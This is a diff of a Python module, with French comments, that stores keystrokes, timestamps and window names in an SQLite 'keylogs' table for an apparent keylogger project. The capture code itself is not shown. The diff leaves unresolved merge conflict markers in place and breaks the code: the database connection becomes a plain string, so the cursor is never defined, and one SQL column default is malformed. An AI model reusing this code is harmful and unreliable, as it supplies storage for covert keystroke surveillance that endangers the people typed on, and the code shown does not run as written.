@@ -1,15 +1,23 @@
 import sqlite3
+<<<<<<< HEAD
 import uuid
 from datetime import datetime
 import listener
+=======
+from listener import flush_buffer, last_timestamp
+>>>>>>> 977c092 (minor change on storage)
 #test  
-con = sqlite3.connect('keylogs.db')
-cur = con.cursor()
-key_data = listener.flush_buffer()
+con = ("keylogs.db")
+
+#_____variables globales pour le buffer et le timestamp____________________________________________
+key_data = listener.flush_buffer() #récupère les données du buffer
 ts = listener.last_timestamp
 window = "Window1" #temporaire a remplacer pars variable
+<<<<<<< HEAD
 buffer_empty = getattr(listener, "buffer_empty", False)
 SESSION_ID = str(uuid.uuid4())[:8]
+=======
+>>>>>>> 977c092 (minor change on storage)
 #___________________________________________________________creation de la table_____________________________________________
 def create_table():
     cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
@@ -17,7 +25,7 @@ def create_table():
     timestamp TEXT,
     key TEXT,
     window TEXT,
-    session_id DEFAULT 'user_session
+    session_id DEFAULT TEXT'user_session'          #regarder si code correct pour session_id
                 ')
     """)
     con.commit()
@@ -31,37 +39,14 @@ def insert_data(timestamp, key, window, session_id):
         buffer_empty = False #réinitialise le buffer_empty aprés insertion
     else:
         print("Buffer en cours d'execution, données non insérées dans la base de données.")
-#____________________________________________________________affichage de toutes les données____________________________________________
-def find_by_timestamp(timestamp1, timestamp2):#chercher par timestamp
-    cur.execute("SELECT timestamp FROM keylogs WHERE timestamp BETWEEN ? AND ? ORDER BY timestamp", (timestamp1, timestamp2))
-    raw1 = cur.fetchall()
-    print(raw1)
-
-def find_by_key(key):#chercher par key
-    cur.execute("SELECT * FROM keylogs WHERE key = ? ORDER BY key", (key,))
-    raw2 = cur.fetchall()
-    print(raw2)
-
-def find_by_window(window):#chercher par window
-    cur.execute("SELECT * FROM keylogs WHERE window = ? ORDER BY window", (window,))
-    raw3 = cur.fetchall()
-    print(raw3)
-
-def find_by_session_id(session_id):#chercher par session_id
-    cur.execute("SELECT * FROM keylogs WHERE session_id = ? ORDER BY session_id", (session_id,))
-    raw4 = cur.fetchall()
-    print(raw4)
-
-def find_by_id(id):#chercher par id
-    cur.execute("SELECT * FROM keylogs WHERE id = ? ORDER BY id", (id,))
-    raw5 = cur.fetchall()
-    print(raw5)
 
 #____________________________________________________________execution du code____________________________________________
 create_table()
-insert_data("2023-10-10 12:00:00", "a", "Window1", "Session1")
 
+<<<<<<< HEAD
 
+=======
+>>>>>>> 977c092 (minor change on storage)
 # netoyage
 
 def clear_old(days=7):
